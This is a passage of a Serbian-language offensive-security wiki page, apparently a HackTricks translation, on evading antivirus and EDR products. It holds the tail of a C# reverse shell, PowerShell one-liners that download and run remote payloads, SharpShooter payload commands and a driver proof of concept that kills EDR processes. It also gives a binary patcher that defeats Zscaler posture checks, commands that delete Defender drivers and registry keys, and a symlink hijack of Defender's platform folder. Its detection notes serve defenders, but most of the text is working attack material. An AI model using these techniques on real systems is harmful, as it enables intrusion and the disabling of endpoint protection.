						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# pomoću kompajlera

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuscatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje Pythona za primer izrade injectora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Gašenje AV/EDR-a iz kernel prostora

Storm-2603 je koristio mali konzolni alat poznat kao **Antivirus Terminator** za deaktiviranje zaštite krajnjih uređaja pre isporuke ransomware-a. Alat donosi **sopstveni ranjivi, ali *potpisani* drajver** i zloupotrebljava ga za izvršavanje privilegovanih kernel operacija koje ne mogu da blokiraju čak ni AV servisi zaštićeni mehanizmom Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Ključne stavke
1. **Potpisani drajver**: Datoteka koja se isporučuje na disk je `ServiceMouse.sys`, ali binarna datoteka je legitimno potpisani drajver `AToolsKrnl64.sys` iz Antiy Labs-ovog „System In-Depth Analysis Toolkit“. Pošto drajver ima važeći Microsoft potpis, učitava se čak i kada je omogućena funkcija Driver-Signature-Enforcement (DSE).
2. **Instalacija servisa**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Prva linija registruje driver kao **kernel service**, a druga ga pokreće, čime `\\.\ServiceMouse` postaje dostupan iz user land-a.
3. **IOCTL-ovi koje driver izlaže**
   | IOCTL kod | Mogućnost                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Terminiranje proizvoljnog procesa prema PID-u (koristi se za gašenje Defender/EDR servisa) |
   | `0x990000D0` | Brisanje proizvoljne datoteke sa diska |
   | `0x990001D0` | Uklanjanje driver-a i brisanje servisa |

   Minimalni C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Zašto funkcioniše**: BYOVD u potpunosti zaobilazi zaštite u user-mode režimu; kod koji se izvršava u kernelu može da otvori *zaštićene* procese, da ih ugasi ili da menja objekte kernela, bez obzira na PPL/PP, ELAM ili druge funkcije za hardening.

Otkrivanje / ublažavanje
• Omogućite Microsoftovu listu blokiranih ranjivih drajvera (`HVCI`, `Smart App Control`) kako bi Windows odbio da učita `AToolsKrnl64.sys`.
• Nadgledajte kreiranje novih *kernel* servisa i upozorite kada se drajver učita iz direktorijuma u koji svi mogu da upisuju ili kada nije na listi dozvoljenih.
• Pratite da li se nakon otvaranja user-mode handle-ova ka prilagođenim objektima uređaja upućuju sumnjivi pozivi `DeviceIoControl`.

### Zaobilaženje Zscaler Client Connector provera stanja uređaja izmenom binarnih datoteka na disku

Zscaler **Client Connector** lokalno primenjuje pravila za stanje uređaja i oslanja se na Windows RPC za prenos rezultata drugim komponentama. Dva slaba izbora u dizajnu omogućavaju potpuno zaobilaženje:

1. Provera stanja uređaja obavlja se **u potpunosti na klijentu** (serveru se šalje logička vrednost).
2. Interni RPC endpoint-i proveravaju samo da li je izvršna datoteka koja se povezuje **potpisana od strane Zscaler-a** (pomoću `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Izmenom četiri potpisane binarne datoteke na disku** oba mehanizma mogu da se neutrališu:

| Binarna datoteka | Izmenjena originalna logika | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1`, pa svaka provera prolazi |
| `ZSAService.exe` | Indirektni poziv funkcije `WinVerifyTrust` | NOP-ed ⇒ bilo koji proces (čak i nepotpisan) može da se poveže sa RPC cevima |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Provere integriteta tunela | Preskočene |

Minimalni isečak patcher-a:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nakon zamene originalnih datoteka i ponovnog pokretanja servisnog steka:

* **Sve** provere stanja prikazuju **zeleno/usaglašeno**.
* Nepotpisani ili izmenjeni binarni fajlovi mogu da otvore RPC krajnje tačke named-pipe (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler pravilima.

Ova studija slučaja pokazuje kako se odluke o poverenju koje se donose isključivo na strani klijenta i jednostavne provere potpisa mogu zaobići sa nekoliko izmena bajtova.

## Zloupotreba pouzdane funkcionalnosti Microsoft Defender `BTR.sys`

Defenderov drajver **Boot-Time Removal** koristan je kontraprimer klasičnom BYOVD-u. `BTR.sys` je legitimna Microsoft-ova komponenta za otklanjanje problema, bez greške u korupciji memorije i bez IOCTL interfejsa; nakon sticanja administratorskog pristupa i privilegije `SeLoadDriverPrivilege`, operater umesto toga može da falsifikuje njegovu privatnu transakciju za otklanjanje problema i izvrši predviđene operacije nad datotekama/registrom u Ring-0 režimu. Ovo je **primitiva za neutralizaciju AV/EDR-a nakon kompromitovanja, a ne početni pristup ili eskalacija privilegija**, a drajver se može izdvojiti iz resursa `BOOTTIMETOOL` u sopstvenom `MpEngine.dll` fajlu mete, umesto da se uveze upadljiv drajver treće strane.<sup>[[36]](#references)</sup>

### Priprema jednokratnog drajvera

Defender obično zapisuje resurs u datoteku nasumičnog imena `[a-z]{8}.sys` i registruje kernel servis sa sličnim imenom. `DriverEntry` čita vrednost `Args` servisa, otvara referencirani NTFS ADS, dešifruje i validira listu radnji, zapisuje povratne informacije i nakon uspešnog izvršavanja vraća `0xC0000056` (`STATUS_DELETE_PENDING`), tako da se drajver ukloni umesto da ostane učитан. Falsifikovani servis ima sledeće karakteristične vrednosti.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

` :changelist` stream sadrži jedan blob šifrovan pomoću RC4. Analizirane verzije ponovo koriste fiksni ključ od 256 bajtova, pa šifrovanje nije granica za autorizaciju. Važeći tekstualni sadržaj ima globalno zaglavlje od 24 bajta (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC zaglavlja i ID transakcije izveden iz sadržaja), iza kog slede putanja do feedback datoteke, završena nulom i kodirana kao UTF-16, i proizvoljan broj stavki. Svaka stavka ima zaglavlje od 16 bajtova (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) i podatke specifične za akciju, koji se završavaju sa **tačno četiri NUL bajta**. Svaki region zaglavlja i podataka proverava se zasebno pomoću CRC-32 polinoma `0xEDB88320`, sa početnim stanjem `0xFFFFFFFF` i **bez završnog XOR-a** (`~CRC32`); CRC stanje se resetuje za svaki region.<sup>[[36]](#references)[[37]](#references)</sup>

Prihvaćeni ID-jevi akcija izlažu ove primitive kernela.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Podaci stavke | Rezultat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Brisanje datoteke, uključujući i zaključanu datoteku |
| 2 | `[UTF-16 path]` | Uklanjanje praznog direktorijuma |
| 3 | `[Flags][source][destination]` | Premeštanje datoteke na zaštićenu putanju koju je izabrao napadač; prazno odredište znači brisanje |
| 4 | `[Flags][key path]` | Rekurzivno brisanje ključa registratora |
| 5 | `[Flags][key path + "\\" + value]` | Brisanje vrednosti registratora |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Kreiranje/ažuriranje vrednosti registratora i kreiranje nedostajućih putanja ključeva |

Kod akcija 5 i 6, separator ključa/vrednosti u serijalizovanim podacima su **dve uzastopne obrnute kose crte**; konvencionalno formatirana putanja neće biti ispravno razdvojena. Feedback datoteka uglavnom preslikava zahtev, ali prva četiri bajta podataka svake stavke postaju njen rezultujući `NTSTATUS`. Kod akcija 1 i 2, koje nemaju početno polje zastavica, BTR premešta putanju u četiri rezervisana završna bajta kako bi napravio prostor za taj status.<sup>[[36]](#references)</sup>

### Tok rada `BTR_CLI` i prozor ranog pokretanja

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) sprovodi ceo niz koraka: izdvaja `BTR.sys` iz lokalnog Defender-a, kreira `<random>.sys:changelist` i feedback stream, serijalizuje/izračunava kontrolne sume/šifruje ulančane akcije, direktno kreira servisni ključ registratora, a zatim poziva `NtLoadDriver` za `-trigger now` ili ostavlja drajver da se pokreće pri startu sistema za `-trigger boot`. Direktno postavljanje u registrator izbegava uobičajeni SCM `CreateServiceW` put i zato **ne** generiše servisni instalacioni Event ID 7045. Artefakti pokrenuti pri podizanju sistema mogu se kasnije ukloniti pomoću `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nije upotrebljiv jer BTR obavlja I/O nad datotekama iz `DriverEntry` pre nego što storage stack i veza `SystemRoot` budu spremni. `Start=1` uz grupu visokog prioriteta `Boot Bus Extender` umesto toga se izvršava u Phase 1: NTFS je upotrebljiv, ali se mnogi bezbednosni drajveri koji se pokreću pri pokretanju sistema i EDR servisi u korisničkom režimu još nisu inicijalizovali. Filteri koji se pokreću pri pokretanju, kao što je `WdFilter`, možda su već učitani, ali BTR može da ukloni njihove binarne datoteke ili konfiguraciju servisa pre sledećeg pokretanja, kao i da obriše izvršne datoteke servisa pre nego što ih SCM pokrene. ELAM ne uklanja ovaj jaz jer se BTR izvršava nakon procene drajvera koji se pokreću pri pokretanju i ima važeći Microsoft potpis.<sup>[[36]](#references)</sup>

Više radnji se izvršava u jednoj transakciji. PoC dodaje Action 1 na početak za hardkodirani `\SystemRoot\Temp\BootClean.log`: BTR kreira ovaj log, zatim obrađuje sopstveni zahtev za brisanje i uklanja ga pre nego što se isprazni iz memorije. Time se smanjuju dokazi, dok zapisivanje povratnih informacija u `<random>.sys:<random>.dat` omogućava da se drajver i oba stream-a uklone zajedno.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacije sa visokim signalom

Pravila zasnovana samo na potpisima i Microsoft lista blokiranih ranjivih drajvera ne rešavaju zloupotrebu predviđene funkcionalnosti BTR-a. Prednost dajte ovim korelacijama ponašanja, uz razlikovanje legitimnog Defender porekla od proizvoljnog pokretača.<sup>[[36]](#references)</sup>

- **Sysmon 15:** kreiranje `.sys:changelist` je univerzalno za BTR staging. ADS `.dat` pridružen istoj `.sys` datoteci posebno je sumnjiv jer legitimni Defender obično smešta povratne informacije u `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** korelišite direktno kreiranje `HKLM\SYSTEM\CurrentControlSet\Services\<random>` koje sadrži `Args=...:changelist` i `Group=Boot Bus Extender`, a nema odgovarajući SCM događaj instalacije.
- **Sysmon 6 -> 23:** korelišite učitavanje poznatog BTR drajvera iz porekla koje nije Defender sa naknadnim brisanjem datoteka koje se pripisuje procesu `System`/PID 4, naročito kada su u pitanju bezbednosne binarne datoteke.
- **Sysmon 11 -> 23:** upozorite na brzo kreiranje i brisanje datoteke `\SystemRoot\Temp\BootClean.log` od strane procesa `System`/PID 4.
- Ograničite i nadgledajte dodeljivanje/omogućavanje privilegije `SeLoadDriverPrivilege`; sam Microsoft potpis nije dovoljan razlog za poverenje kada bezbednosni alat pokreće drajver iz procesa `cmd.exe`, PowerShell ili nepoznatog procesa.

## Zloupotreba Protected Process Light (PPL) za ometanje AV/EDR pomoću LOLBIN-ova

Protected Process Light (PPL) sprovodi hijerarhiju potpisivača/nivoa, tako da samo zaštićeni procesi istog ili višeg nivoa mogu da ometaju jedni druge. Iz ofanzivnog ugla, ako možete legitimno da pokrenete binarnu datoteku koja podržava PPL i kontrolišete njene argumente, možete da pretvorite benignu funkcionalnost (npr. evidentiranje) u ograničenu write primitivu zasnovanu na PPL-u, usmerenu na zaštićene direktorijume koje koriste AV/EDR alati.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Šta je potrebno da bi se proces pokrenuo kao PPL
- Ciljna EXE datoteka (i sve učitane DLL datoteke) mora biti potpisana EKU-om koji podržava PPL.
- Proces mora biti kreiran pomoću CreateProcess i sledećih oznaka: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora se zatražiti kompatibilan nivo zaštite koji odgovara potpisivaču binarne datoteke (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za potpisivače anti-malware softvera, `PROTECTION_LEVEL_WINDOWS` za Windows potpisivače). Pogrešan nivo dovešće do neuspeha pri kreiranju procesa.

Ovde pogledajte i širi uvod u PP/PPL i zaštitu LSASS-a:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Alati za pokretanje
- Pomoćni alat otvorenog koda: CreateProcessAsPPL (bira nivo zaštite i prosleđuje argumente ciljnoj EXE datoteci):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Obrazac upotrebe:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitiv: ClipUp.exe
- Potpisani sistemski binarni fajl `C:\Windows\System32\ClipUp.exe` pokreće sam sebe i prihvata parametar za upisivanje log fajla na putanju koju zadaje pozivalac.
- Kada se pokrene kao PPL proces, upisivanje fajla obavlja se uz PPL zaštitu.
- ClipUp ne može da parsira putanje koje sadrže razmake; koristite kratke putanje 8.3 za pristup uobičajeno zaštićenim lokacijama.

Pomoćne alatke za kratke putanje 8.3
- Prikažite kratka imena: `dir /x` u svakom nadređenom direktorijumu.
- Izvedite kratku putanju u cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Lanac zloupotrebe (apstraktno)
1) Pokrenite LOLBIN koji podržava PPL (ClipUp) pomoću `CREATE_PROTECTED_PROCESS` uz launcher (npr. CreateProcessAsPPL).
2) Prosledite ClipUp argument za putanju log fajla da biste izazvali kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Po potrebi koristite kratка imena 8.3.
3) Ako je ciljni binarni fajl obično otvoren/zaključan od strane AV-a dok radi (npr. MsMpEng.exe), zakažite upisivanje pri pokretanju sistema, pre pokretanja AV-a, instaliranjem usluge za automatsko pokretanje koja se pouzdano pokreće ranije. Proverite redosled pokretanja pomoću Process Monitor-a (evidentiranje pokretanja sistema).
4) Nakon ponovnog pokretanja, upisivanje uz PPL zaštitu izvršava se pre nego što AV zaključa svoje binarne fajlove, čime se oštećuje ciljni fajl i sprečava pokretanje.

Primer poziva (putanje su redigovane/skraćene radi bezbednosti):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Napomene i ograničenja
- Ne možete da kontrolišete sadržaj koji ClipUp upisuje, već samo mesto upisa; ova primitiva je pogodna za korupciju, a ne za precizno ubacivanje sadržaja.
- Potrebni su lokalni administratorski/SYSTEM pristup za instaliranje/pokretanje usluge i period za ponovno pokretanje.
- Tajming je ključan: cilj ne sme biti otvoren; izvršavanje pri pokretanju izbegava zaključavanje datoteka.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito ako ga pokreću nestandardni pokretači, u vreme pokretanja sistema.
- Nove usluge podešene da automatski pokreću sumnjive binarne datoteke i dosledno se pokreću pre Defendera/AV-a. Istražite kreiranje/izmenu usluga pre neuspešnog pokretanja Defendera.
- Praćenje integriteta datoteka Defendera/direktorijuma Platform; neočekivano kreiranje/izmena datoteka od strane procesa sa oznakama zaštićenog procesa.
- ETW/EDR telemetrija: potražite procese pokrenute sa `CREATE_PROTECTED_PROCESS` i neuobičajenu upotrebu PPL nivoa od strane binarnih datoteka koje nisu AV.

Ublažavanje
- WDAC/Code Integrity: ograničite koje potpisane binarne datoteke mogu da rade kao PPL i pod kojim roditeljskim procesima; blokirajte pozivanje ClipUp-a izvan legitimnih konteksta.
- Higijena usluga: ograničite kreiranje/izmenu usluga koje se automatski pokreću i nadgledajte manipulisanje redosledom pokretanja.
- Uverite se da su zaštita od neovlašćenih izmena Defendera i zaštite pri ranom pokretanju omogućene; istražite greške pri pokretanju koje ukazuju na oštećenje binarne datoteke.
- Razmotrite onemogućavanje generisanja kratkih imena u formatu 8.3 na volumenima na kojima se nalaze bezbednosni alati, ako je to kompatibilno sa vašim okruženjem (temeljno testirajte).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender bira platformu sa koje se pokreće tako što nabraja poddirektorijume u:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Bira poddirektorijum sa najvišim leksikografskim nizom verzije (npr. `4.18.25070.5-0`), a zatim iz njega pokreće procese usluge Defender (uz ažuriranje putanja usluge/registratora). Ovaj izbor veruje stavkama direktorijuma, uključujući tačke za ponovno parsiranje direktorijuma (symlinks). Administrator može to da iskoristi za preusmeravanje Defendera na putanju u koju napadač može da upisuje i postizanje DLL sideloading-a ili prekida rada usluge.<sup>[[21]](#references)[[22]](#references)</sup>

Preduslovi
- Lokalni administrator (potreban za kreiranje direktorijuma/symlinks-a u direktorijumu Platform)
- Mogućnost ponovnog pokretanja sistema ili pokretanja ponovnog izbora platforme Defendera (ponovno pokretanje usluge pri pokretanju sistema)
- Potrebni su samo ugrađeni alati (`mklink`)

Zašto funkcioniše
- Defender blokira upisivanje u sopstvene fascikle, ali njegov izbor platforme veruje stavkama direktorijuma i bira leksikografski najvišu verziju bez provere da li se cilj razrešava na zaštićenu/pouzdanu putanju.

Koraci (primer)
1) Pripremite klon trenutne fascikle platforme u koju možete da upisujete, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte direktorijumski symlink sa višom verzijom unutar direktorijuma Platform koji pokazuje na vaš folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučuje se ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) izvršava iz preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da primetite novu putanju procesa u okviru `C:\TMP\AV\` i konfiguraciju servisa/registar koji odražavaju tu lokaciju.

Opcije nakon eksploatacije
- DLL sideloading/code execution: Postavite/zamenite DLL-ove koje Defender učitava iz svog direktorijuma aplikacije da biste izvršili kod u Defender procesima. Pogledajte gornji odeljak: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Gašenje servisa/uskraćivanje usluge: Uklonite simboličku vezu verzije kako se konfigurisana putanja ne bi razrešila pri sledećem pokretanju, zbog čega Defender neće moći da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne omogućava eskalaciju privilegija; potrebna su administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red timovi mogu da izmeste runtime evasion iz C2 implantata u sam ciljni modul tako što će postaviti hook na njegovu Import Address Table (IAT) i usmeriti odabrane API-je kroz position-independent code (PIC) pod kontrolom napadača. Time se evasion primenjuje na širi skup API-ja od onog koji izlažu mnogi kitovi (npr. CreateProcessA), a ista zaštita proširuje se i na BOF-ove i post-exploitation DLL-ove.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Pristup na visokom nivou
- Postavite PIC blob uz ciljni modul pomoću reflective loader-a (na početak ili kao prateću datoteku). PIC mora biti samostalan i position-independent.
- Dok se host DLL učitava, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i izmenite IAT unose ciljanih importa (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) tako da upućuju na tanke PIC omotače.
- Svaki PIC omotač izvršava evasion radnje pre nego što poziv prosledi stvarnoj adresi API-ja. Uobičajene evasion radnje obuhvataju:
  - Maskiranje/demaskiranje memorije oko poziva (npr. šifrovanje beacon regiona, RWX→RX, promena naziva/permissions stranica), a zatim vraćanje stanja nakon poziva.
  - Call-stack spoofing: napravite benigni stek i pređite na ciljni API tako da analiza call stack-a prikaže očekivane frame-ove.<sup>[[9]](#references)</sup>
- Radi kompatibilnosti, izvezite interfejs kako bi Aggressor skripta (ili ekvivalent) mogla da registruje API-je za postavljanje hook-a u Beacon, BOF-ove i post-exploitation DLL-ove.

Zašto ovde koristiti IAT hooking
- Radi sa svakim kodom koji koristi hook-ovani import, bez izmena koda alata i bez oslanjanja na Beacon da prosleđuje određene API-je.
- Pokriva post-exploitation DLL-ove: postavljanje hook-a na LoadLibrary* omogućava presretanje učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenu istog maskiranja/evasion-a steka na njihove API pozive.
- Omogućava pouzdanu upotrebu post-exploitation komandi koje pokreću procese, uprkos detekcijama zasnovanim na call stack-u, tako što obavija CreateProcessA/W.

Osnovni prikaz IAT hook-a (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primeni patch nakon relocations/ASLR, a pre prve upotrebe importa. Reflective loaders kao što su TitanLdr/AceLdr demonstriraju hooking tokom DllMain-a učitanog modula.
- Wrapper-e drži malim i bezbednim za PIC; pravu API funkciju razreši pomoću originalne IAT vrednosti koju si sačuvao pre patchovanja ili preko LdrGetProcedureAddress.
- Koristi RW → RX prelaze za PIC i izbegavaj stranice koje su istovremeno writable i executable.

Stub za lažiranje steka poziva
- PIC stub-ovi u Draugr stilu grade lažni lanac poziva (povratne adrese unutar benignih modula), a zatim prebacuju izvršavanje na pravu API funkciju.
- Time se zaobilaze detekcije koje očekuju kanoničke stekove od Beacon/BOFs poziva ka osetljivim API funkcijama.
- Kombinuj ovo sa tehnikama stack cutting/stack stitching da bi se izvršavanje smestilo unutar očekivanih frame-ova pre prologa API funkcije.

Operativna integracija
- Postavi reflective loader ispred post-ex DLL-ova kako bi se PIC i hooks automatski inicijalizovali pri učitavanju DLL-a.
- Koristi Aggressor script za registraciju ciljnih API funkcija, kako bi Beacon i BOFs transparentno koristili isti put za evaziju bez izmena koda.

Napomene za detekciju/DFIR
- Integritet IAT-a: unosi koji se razrešavaju u adrese izvan image-a (heap/anon); periodična provera import pointer-a.
- Anomalije steka: povratne adrese koje ne pripadaju učитаним image-ovima; nagli prelazi na PIC izvan image-a; nedosledno nasleđe RtlUserThreadStart.
- Telemetrija loader-a: upisi u IAT из procesa; рана активност DllMain-а која мења import thunk-ове; неочекивани RX региони креирани при учитавању.
- Избегавање учитавања image-а: ако се hook-ује LoadLibrary*, надзирати сумњива учитавања automation/clr assembly-ја повезана са догађајима маскирања меморије.

Повезани градивни блокови и примери
- Reflective loader-и који обављају IAT patching током учитавања (нпр. TitanLdr, AceLdr)
- Hook-ови за маскирање меморије (нпр. simplehook) и PIC за stack cutting (stackcutting)
- PIC stub-ови за лаžирање стека позива (нпр. Draugr)


## IAT Hooking при учитавању + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hooks при учитавању преко резидентног PICO-а

